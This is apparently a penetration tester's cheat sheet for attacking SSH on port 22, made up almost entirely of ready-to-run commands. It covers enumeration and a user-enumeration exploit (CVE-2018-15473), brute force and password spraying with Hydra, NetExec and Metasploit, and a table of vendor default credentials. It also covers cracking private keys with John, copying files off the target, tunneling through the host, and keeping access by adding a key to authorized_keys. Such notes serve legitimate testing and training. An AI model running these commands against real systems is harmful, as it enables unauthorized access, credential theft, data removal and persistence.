# Port 22 - SSH

## Table of Contents

- [Enumeration](#enumeration)
  - [Banner Grabbing](#banner-grabbing)
  - [Nmap Scripts](#nmap-scripts)
  - [Legacy Algorithms](#legacy-algorithms)
  - [User Enumeration](#user-enumeration)
- [Brute Force](#brute-force)
- [SSH Key Attacks](#ssh-key-attacks)
- [File Transfer](#file-transfer)
- [Post-Exploitation](#post-exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
nc -vn $rhost 22 && nmap -p 22 --script "ssh-auth-methods,ssh2-enum-algos" $rhost
```

### Banner Grabbing (One-liner)

```shell
# Quick banner + version
nc -vn $rhost 22 2>&1 | head -1 && ssh -o BatchMode=yes -o ConnectTimeout=3 $rhost 2>&1 | grep -i 'ssh'

# SSH audit (comprehensive)
ssh-audit $rhost 2>/dev/null | head -30
```

### Nmap Scripts (One-liner)

```shell
# All SSH scripts in one command
nmap -p 22 -sV --script "ssh-*" $rhost

# Quick enumeration
nmap -p 22 --script "ssh-auth-methods,ssh2-enum-algos,ssh-hostkey" --script-args="ssh.user=root" $rhost
```

### Legacy Algorithms (One-liner)

```shell
# Connect to old SSH servers (combined legacy options)
ssh -o KexAlgorithms=+diffie-hellman-group1-sha1 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@$rhost
```

### User Enumeration (CVE-2018-15473)

```shell
# Metasploit one-liner
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS $rhost; set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt; run; exit"
```

---

## Brute Force (One-liner)

### Hydra

```shell
# Single user brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://$rhost

# User list + password list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://$rhost
```

### NetExec

```shell
# Password spray
nxc ssh $rhost -u users.txt -p 'Password123!' --continue-on-success

# Credential stuffing
nxc ssh $rhost -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Brute force
nxc ssh $rhost -u users.txt -p passwords.txt

# With default credential list
nxc ssh $rhost -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
```

### SSH Default Credentials Reference

| Vendor/Device | Username | Password |
|---------------|----------|----------|
| APC UPS | apc | apc |
| Brocade | admin | password, fibranne |
| Cisco | cisco | cisco |
| Cisco | admin | admin |
| Citrix | root | nsroot |
| Dell iDRAC | root | calvin |
| F5 BIG-IP | root | default |
| FortiGate | admin | (blank) |
| HP iLO | Administrator | (varies) |
| Juniper | root | (blank) |
| Netgear | admin | password |
| Palo Alto | admin | admin |
| Raspberry Pi | pi | raspberry |
| SonicWall | admin | password |
| Synology | admin | (blank) |
| Ubiquiti | ubnt | ubnt |
| Ubuntu | ubuntu | ubuntu |
| VMware ESXi | root | vmware |
| Zyxel | admin | 1234 |
| pfSense | admin | pfsense |

> **Wordlist Location**: `/usr/share/seclists/Passwords/Default-Credentials/`

### Nmap

```shell
nmap -p 22 --script "ssh-brute" --script-args userdb=users.txt,passdb=passwords.txt $rhost
```

### Metasploit

```shell
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $rhost
set USER_FILE users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

---

## SSH Key Attacks

### Private Key Authentication

```shell
# Set proper permissions
chmod 600 id_rsa

# Connect with key
ssh -i id_rsa user@$rhost

# Specify key type
ssh -i id_rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa user@$rhost
```

### SSH Key Cracking

```shell
# Convert to John format
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash

# Crack with John
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

# Show cracked password
john --show id_rsa.hash
```

### Public Key Extraction

```shell
# Scan for SSH hostkeys
ssh-keyscan -t rsa $rhost

# Get all key types
ssh-keyscan -t rsa,dsa,ecdsa,ed25519 $rhost
```

---

## File Transfer

### SCP - Secure Copy

> Download from target

```shell
# Single file
scp user@$rhost:/path/to/file ./local_file

# Directory recursive
scp -r user@$rhost:/path/to/directory ./

# With legacy algorithms
scp -o "KexAlgorithms=+diffie-hellman-group1-sha1" -o "HostKeyAlgorithms=+ssh-rsa" user@$rhost:/path/file ./
```

> Upload to target

```shell
# Single file
scp ./local_file user@$rhost:/path/to/destination

# With key authentication
scp -i id_rsa ./file user@$rhost:/tmp/
```

### SFTP

```shell
# Interactive session
sftp user@$rhost

# Commands: ls, cd, get, put, mkdir, rm
```

---

## Post-Exploitation

### SSH Tunneling

```shell
# Local port forwarding (access remote service locally)
ssh -L 8080:127.0.0.1:80 user@$rhost
# Access remote port 80 via localhost:8080

# Remote port forwarding (expose local service to remote)
ssh -R 8080:127.0.0.1:80 user@$rhost
# Remote can access your port 80 via localhost:8080

# Dynamic SOCKS proxy
ssh -D 1080 user@$rhost
# Configure browser to use SOCKS5 proxy on localhost:1080

# Jump host / Bastion
ssh -J user@jumphost user@internal_target
```

### Persistence

```shell
# Add SSH key for persistence
echo "your_public_key" >> ~/.ssh/authorized_keys

# Generate key pair on target
ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N ""
```

### Config File Locations

```
# SSH server config
/etc/ssh/sshd_config

# User keys
~/.ssh/authorized_keys
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/known_hosts

# SSH agent
/tmp/ssh-*/agent.*
```




